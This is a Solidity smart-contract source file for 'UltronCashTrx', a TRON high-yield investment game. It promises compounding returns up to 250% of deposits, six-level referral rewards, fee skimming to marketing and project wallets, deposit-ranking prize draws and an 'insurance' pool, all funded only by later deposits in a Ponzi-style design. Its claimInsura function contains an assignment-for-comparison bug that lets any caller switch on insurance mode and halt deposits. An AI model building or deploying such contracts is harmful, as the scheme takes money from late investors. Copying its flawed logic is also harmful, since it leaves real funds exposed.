//SourceUnit: UltronCashTrx.sol

pragma solidity 0.5.4;

contract UltronCashTrx {

    using SafeMath for *;

    uint constant public INVEST_MIN_AMOUNT = 200 trx;
    uint constant public SAVING_POOL_STEP = 1000000 trx;
    uint constant public COMMUNITY_STEP = 100;
    uint constant public TIME_STEP = 1 days;

    uint constant public MARKETING_FEE = 800;
    uint constant public PROJECT_FEE = 200;
    uint constant public CYCLE_POOL_PERCENT = 300;    
    uint constant public INSURA_POOL_PERCENT = 500;
    
    uint constant public BASE_POOL_PERCENT = 100;
    uint constant public MAX_POOL_PERCENT = 500;
    uint constant public MAX_HOLD_PERCENT = 200;
    uint constant public MAX_COMMUNITY_PERCENT = 200;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public SECOND_PERCENT_DIV = 115741; //The second profit of 1 percent *INTERESTS_DIVIDER : (1/86400(notice:1days)/100)*INTERESTS_DIVIDER (1%)
    uint constant public INTERESTS_DIVIDER = 1000000000000;

    uint constant public CYCLE_LAST_PERCENT = 500;
    uint[] public CYCLE_TOP_PERCENTS = [1000, 3000, 5500];
    uint[] public TOP_PERSONAL_PERCENTS = [800, 1400, 2000];
    uint[] public REFERRAL_PERCENTS = [500, 300, 200, 100, 50, 50];

    address payable private marketingAddr;
    address payable private projectAddr;
    address payable private owner;

    struct User {
        address upline;
        Deposit[] deposits;
        uint64 allDeposited;
        uint64 interestHis;
        uint64 insuraClaimed;
        uint64 refBonus;
        uint64 directRefDpts;
        uint64 cycleBonus;
        uint64 cycleDeposit;
        uint32 depositpoint;
        uint32 checkpoint;
        uint32 insurapoint;
        uint24[6] refs;
        uint24 dCursor;
    }

    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        uint32 startTime;
    }

    struct CycleRecord {
        address winner;
        uint64 bonus;
    }

    uint public cycle = 0;
    uint public totalUsers;
    uint public totalDeposits;
    uint public totalInsuraClaimed;
    uint public poolPercent;
    uint public cyclePool;
    uint public insuraPool;
    uint32 public startTime;
    uint32 public lastDrawTime;
    uint32 public insuraStartTime;
    bool public activated = false;
    bool public insuraActivated = false;

    address[3] cycleTop;
    CycleRecord[4] cycleHis;
    
    mapping (address => User) internal users;
    
    event logNewbie(address user);
    event logNewDeposit(address indexed user, uint amount);
    event logReferralBonus(address indexed upline, address indexed referral, uint256 indexed level, uint256 amount);
    event logFeePayed(address indexed user, uint totalAmount);
    event logTopPayed(address indexed user, uint bonus, uint place);
    event logLastPayed(address indexed user, uint bonus);
    event logWithdrawal(address indexed user, uint amount);
    event logInsuraClaim(address indexed  user, uint amount);
    event logInsuraActivated(uint cyclePoolRemaining);

    modifier isActivated() {
        require(activated == true && now > startTime, "not start!");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner!");
        _;
    }

    constructor(address payable marketing, address payable project) public {
        require(!isContract(marketing) && !isContract(project));
        marketingAddr = marketing;
        projectAddr = project;
        owner = msg.sender;
    }

    function activateGame(uint32 launchTime) external onlyOwner {
        require(activated == false, "already activated!");
        require(launchTime > uint32(block.timestamp), "launchTime must be bigger than current time.");
        startTime = launchTime;
        lastDrawTime = startTime;
        poolPercent = _getPoolPercent();
        cycle++;
        activated = true;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function deposit(address referrer) public isActivated payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);      
        require(insuraActivated == false, "Stop deposit when the insurance has been activated.");
        require(msg.value >= INVEST_MIN_AMOUNT, "Min.investment can't be less than 200 trx");

        User storage user = users[msg.sender];
        require(user.deposits.length.sub(user.dCursor) < 100, "Allow maximum 100 unclosed deposits from address");

        if (user.upline == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender ) {
            user.upline = referrer;              
        }
        
        if (user.deposits.length == 0) {
            totalUsers++;
            user.checkpoint = uint32(block.timestamp);
            emit logNewbie(msg.sender);
        }

        uint toDeposit = msg.value;

        if (user.upline != address(0)) {
            address upline = user.upline;
            users[upline].directRefDpts = uint64(uint(users[upline].directRefDpts).add(toDeposit));
            for (uint8 i = 0; i < 6; i++) {
                if(upline == address(0)) break;
                if(isActive(upline)) {
                    uint reward = toDeposit.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    address(uint160(upline)).transfer(reward);

                    users[upline].refBonus = uint64(uint(users[upline].refBonus).add(reward));
                    users[upline].refs[i]++;

                    emit logReferralBonus(upline, msg.sender, i, reward);
                }
                
                upline = users[upline].upline;
            }
        }

        user.deposits.push(Deposit(uint64(toDeposit), 0, uint32(block.timestamp)));
        user.allDeposited = uint64(uint(user.allDeposited).add(toDeposit));
        totalDeposits = totalDeposits.add(toDeposit);

        _poolDeposit(msg.sender, toDeposit);
        if (lastDrawTime + TIME_STEP < block.timestamp) _poolDraw(msg.sender);

        uint marketingFee = toDeposit.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = toDeposit.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        marketingAddr.transfer(marketingFee);
        projectAddr.transfer(projectFee);
        
        emit logFeePayed(msg.sender, marketingFee.add(projectFee));


        if (poolPercent < MAX_POOL_PERCENT) {
            uint poolPercentNew = _getPoolPercent();
            if (poolPercentNew > poolPercent) poolPercent = poolPercentNew;
        }

        emit logNewDeposit(msg.sender, toDeposit);
    }

    function withdraw() public isActivated {
        User storage user = users[msg.sender];
        require(((block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP)) > 0 || user.interestHis == 0, "24 Hours not passed");

        uint toSend;
        uint secDivPercent = getUserSecDivPercent(msg.sender);

        for (uint i = uint(user.dCursor); i < user.deposits.length; i++) {
            uint fromTime = user.deposits[i].startTime > user.checkpoint ? uint(user.deposits[i].startTime) : uint(user.checkpoint);
            uint dividends = uint(user.deposits[i].amount).mul(block.timestamp.sub(fromTime)).mul(secDivPercent).div(INTERESTS_DIVIDER);
            if(uint(user.deposits[i].withdrawn.add(dividends)) >= uint(user.deposits[i].amount).mul(25).div(10)) {
                dividends = (uint(user.deposits[i].amount).mul(25).div(10)).sub(uint(user.deposits[i].withdrawn));
                user.dCursor++;
            }
            toSend = toSend.add(dividends);
            user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends));
        }

        uint savingPool = _getSavingPool();
        if (toSend > savingPool) toSend  = savingPool;

        require(toSend > 0, "No fund to withdrawn");

        user.interestHis = uint64(uint(user.interestHis).add(toSend));

        insuraPool = insuraPool.add(toSend.mul(INSURA_POOL_PERCENT).div(PERCENTS_DIVIDER));

        msg.sender.transfer(toSend.mul(95).div(100)); 
        user.checkpoint = uint32(block.timestamp);

        savingPool = _getSavingPool();

        if(savingPool < 10 trx) {
            uint remaining = 0;
            if(cyclePool > 0) {
                insuraPool = insuraPool.add(cyclePool);
                remaining = remaining.add(cyclePool);
                cyclePool = 0;
            }
            if(savingPool > 0) { // save the dust to insurapool
                insuraPool = insuraPool.add(savingPool);
            }

            insuraActivated = true;
            insuraStartTime = uint32(block.timestamp);  

            emit logInsuraActivated(remaining);
        }

        emit logWithdrawal(msg.sender, toSend);
    }

    function claimInsura() public isActivated {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(insuraActivated = true);
        User storage user = users[msg.sender];
        require(uint(user.interestHis) < uint(user.allDeposited).div(2), "Interest incomes must be less than 50% of total deposits");
        require(((block.timestamp.sub(uint(user.insurapoint))).div(TIME_STEP.div(2))) > 0 || user.insuraClaimed == 0, "12 Hours not passed");
        
        uint fromTime = user.insurapoint > insuraStartTime ? uint(user.insurapoint) : uint(insuraStartTime);
        uint toSend = uint(user.allDeposited).mul(1000).div(PERCENTS_DIVIDER).mul(block.timestamp.sub(fromTime)).div(TIME_STEP);
        
        if(toSend.add(uint(user.interestHis)) > uint(user.allDeposited).div(2)) toSend = uint(user.allDeposited).div(2).sub(uint(user.interestHis));
        if(toSend > insuraPool) toSend = insuraPool;

        require(toSend > 0, "No fund to claim");

        insuraPool = insuraPool.sub(toSend);
        user.insuraClaimed = uint64(uint(user.insuraClaimed).add(toSend));
        user.interestHis = uint64(uint(user.interestHis).add(toSend));
        user.insurapoint = uint32(block.timestamp);
        totalInsuraClaimed = totalInsuraClaimed.add(toSend);
    
        msg.sender.transfer(toSend);
        
        emit logInsuraClaim(msg.sender, toSend);
    }

    function _poolDeposit(address userAddr, uint toDeposit) private {
        User storage user = users[userAddr];
        user.cycleDeposit = user.depositpoint > lastDrawTime ? uint64(uint(user.cycleDeposit).add(toDeposit)) : uint64(toDeposit);
        user.depositpoint = uint32(block.timestamp);

        cyclePool = cyclePool.add(toDeposit.mul(CYCLE_POOL_PERCENT).div(PERCENTS_DIVIDER));

        bool judge = false;
        int8 index = -1;
        for(uint8 i = 0; i < 3; i++) {
            if (user.cycleDeposit > users[cycleTop[i]].cycleDeposit) {
                index = int8(i);
                if(judge) {
                    address tmpUserAddr = cycleTop[i];
                    cycleTop[i] = userAddr;
                    cycleTop[i-1] = tmpUserAddr;
                }
            }
            if (userAddr == cycleTop[i]) judge = true;
        } 
        if (judge == false) {
            for(uint8 i = 0; int8(i) <= index; i++) {
                address tmpUserAddr = cycleTop[i];
                cycleTop[i] = userAddr;
                if(i != 0) cycleTop[i - 1] = tmpUserAddr;
            }
        }       
    }

    function _poolDraw(address userAddr) private {    
        uint distribute = cyclePool.div(10);
        for(uint8 i = 0; i < 3; i++) {
            address winnerAddr = cycleTop[i];
            if(winnerAddr != address(0)){
                uint reward = distribute.mul(CYCLE_TOP_PERCENTS[i]).div(PERCENTS_DIVIDER);
                uint limit = uint(users[winnerAddr].cycleDeposit).mul(TOP_PERSONAL_PERCENTS[i]).div(PERCENTS_DIVIDER);  

                if (reward > limit) reward = limit;        
                cyclePool = cyclePool.sub(reward);
                users[winnerAddr].cycleBonus = uint64(uint(users[winnerAddr].cycleBonus).add(reward));

                address(uint160(winnerAddr)).transfer(reward);

                emit logTopPayed(winnerAddr, reward, 3-i);

                cycleHis[i].winner = winnerAddr;
                cycleHis[i].bonus = uint64(reward);
            } else {
                delete cycleHis[i];
            }
        }
        
        uint reward = distribute.mul(CYCLE_LAST_PERCENT).div(PERCENTS_DIVIDER);
        users[userAddr].cycleBonus = uint64(uint(users[userAddr].cycleBonus).add(reward));
        cyclePool = cyclePool.sub(reward);

        msg.sender.transfer(reward);
        emit logLastPayed(userAddr, reward);

        cycleHis[3].winner = userAddr;
        cycleHis[3].bonus = uint64(reward);

        lastDrawTime = uint32(block.timestamp);
        cycle++;
        delete cycleTop;
    }

    function _getSavingPool() internal view returns(uint) {
        return address(this).balance.sub(insuraPool).sub(cyclePool);
    }

    function _getPoolPercent() internal view returns (uint) {  // 0.05% per 1,000,000 trx
        uint savingPool = _getSavingPool();
        uint savingPercent = BASE_POOL_PERCENT.add(savingPool.div(SAVING_POOL_STEP).mul(5));

        return savingPercent < MAX_POOL_PERCENT ? savingPercent : MAX_POOL_PERCENT;
    }

    function getUserSecDivPercent(address userAddr) public view returns (uint) {
        uint refIncentivePercent = getDirectRefPercent(userAddr);
        uint holdPercent = getHoldPercent(userAddr);
        uint communityPercent = getCommunityPercent();
        return (poolPercent.add(refIncentivePercent).add(holdPercent).add(communityPercent)).mul(SECOND_PERCENT_DIV).div(100);
    }

    function getHoldPercent(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];
        if (isActive(userAddr)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP).mul(5); //0.05% per day
            if(timeMultiplier > MAX_HOLD_PERCENT){
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return timeMultiplier;
        }else{
            return 0;
        }
    }

    function getCommunityPercent() public view returns (uint) {
        uint communityPercent = totalUsers.div(COMMUNITY_STEP).mul(2); //0.02% per 100 active user
        if (communityPercent < MAX_COMMUNITY_PERCENT) {
            return communityPercent;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }

    function getDirectRefPercent(address userAddr) public view returns (uint) {
        uint directRefDpts = uint(users[userAddr].directRefDpts);
        if(directRefDpts < 1000 trx) {
           return 0;
        } else if (directRefDpts >= 1000 trx && directRefDpts < 5000 trx) {
            return 5;
        } else if (directRefDpts >= 5000 trx && directRefDpts < 10000 trx) {
            return 10;
        } else if (directRefDpts >= 10000 trx && directRefDpts < 20000 trx) {
            return 50;
        } else if (directRefDpts >= 20000 trx && directRefDpts < 50000 trx) {
            return 75;
        } else if (directRefDpts >= 50000 trx) {
            return 100;
        }
    }


    function isActive(address userAddr) public view returns (bool) {
        return users[userAddr].deposits.length > users[userAddr].dCursor;
    }

    function getUserInsura(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];
        uint availInsura = 0;

        if (insuraActivated && uint(user.interestHis) < uint(user.allDeposited).div(2)) {
            uint fromTime = user.insurapoint > insuraStartTime ? uint(user.insurapoint) : uint(insuraStartTime);
            availInsura = uint(user.allDeposited).mul(1000).div(PERCENTS_DIVIDER).mul(block.timestamp.sub(fromTime)).div(TIME_STEP);
            if (uint(user.interestHis).add(availInsura) > uint(user.allDeposited).div(2)) {
                availInsura = uint(user.allDeposited).div(2).sub(uint(user.interestHis));
            }
        } 
        return availInsura;
    }

    function getPendingInterest(address userAddr) public view returns (uint) {
        User storage user = users[userAddr];
        uint secDivPercent = getUserSecDivPercent(userAddr);
        uint interests = 0;
        for(uint i = uint(user.dCursor); i < user.deposits.length; i++) {
            uint fromTime = user.deposits[i].startTime > user.checkpoint ? uint(user.deposits[i].startTime) : uint(user.checkpoint);
            uint dividends = uint(user.deposits[i].amount).mul(block.timestamp.sub(fromTime)).mul(secDivPercent).div(INTERESTS_DIVIDER);
            if(uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(25).div(10)) {
                dividends = (uint(user.deposits[i].amount).mul(25).div(10)).sub(uint(user.deposits[i].withdrawn));
            } 
            interests = interests.add(dividends);
        }
        return interests;
    }

    function getUserDeposits(address userAddr) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddr];
        uint secDivPercent = getUserSecDivPercent(userAddr); 

        uint length = user.deposits.length;     
        uint[] memory amount = new uint[](length);
        uint[] memory withdrawn = new uint[](length);
        uint[] memory start = new uint[](length);
        uint[] memory status = new uint[](length);

        for(uint i = 0; i < length; i++) {
            amount[i] = uint(user.deposits[i].amount);
            if(i >= user.dCursor) {
                uint fromTime = user.deposits[i].startTime > user.checkpoint ? uint(user.deposits[i].startTime) : uint(user.checkpoint);
                uint dividends = uint(user.deposits[i].amount).mul(block.timestamp.sub(fromTime)).mul(secDivPercent).div(INTERESTS_DIVIDER);
                if(uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(25).div(10)) {
                    status[i] = 2; // active reached limit
                } else {
                    status[i] = 1; // active generating interest
                }
            } else {
                status[i] = 3;     // closed
            }
            withdrawn[i] = uint(user.deposits[i].withdrawn);
            start[i] = uint(user.deposits[i].startTime);
        }
        return (amount, withdrawn, start, status);
    }

    function getCurrentTopInfo() public view  returns (address[] memory, uint[] memory) {
        uint length = cycleTop.length;
        address[] memory addrs = new address[](length);
        uint[] memory deposits = new uint[](length);
        for(uint i = 0; i < length; i++) {
            addrs[i] = cycleTop[i];
            deposits[i] = uint(users[cycleTop[i]].cycleDeposit);
        }
        return (addrs, deposits);
    }

    function getPreviousTopHisInfo() public view  returns (address[] memory, uint[] memory) {
        uint length = cycleHis.length;
        address[] memory addrs = new address[](length);
        uint[] memory rewards = new uint[](length);
        for(uint i = 0; i < length; i++) {
            addrs[i] = cycleHis[i].winner;
            rewards[i] = uint(cycleHis[i].bonus);
        }
        return (addrs, rewards);
    }

    function getUserStats(address userAddr) public view returns (uint[10] memory userInfo, uint24[6] memory refs, address upline) {
        User storage user = users[userAddr];
        userInfo[0] = uint(user.allDeposited);
        userInfo[1] = uint(user.interestHis);
        userInfo[2] = uint(user.insuraClaimed);
        userInfo[3] = uint(user.refBonus);
        userInfo[4] = uint(user.directRefDpts);
        userInfo[5] = uint(user.cycleBonus);
        userInfo[6] = user.depositpoint > lastDrawTime ? uint(user.cycleDeposit) : 0;
        userInfo[7] = getUserInsura(userAddr);
        userInfo[8] = uint(user.checkpoint);
        userInfo[9] = uint(user.insurapoint);
        refs = user.refs;
        upline = user.upline;
    }

    function getGlobalStats() public view returns(uint, uint, uint, uint, uint, uint, uint, uint, uint32, uint32, uint32) {
       return (
          totalDeposits,
          totalInsuraClaimed,
          totalUsers,
          cycle,
          insuraPool,
          cyclePool,
          _getSavingPool(),
          poolPercent,
          startTime,
          lastDrawTime,
          insuraStartTime
       );
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}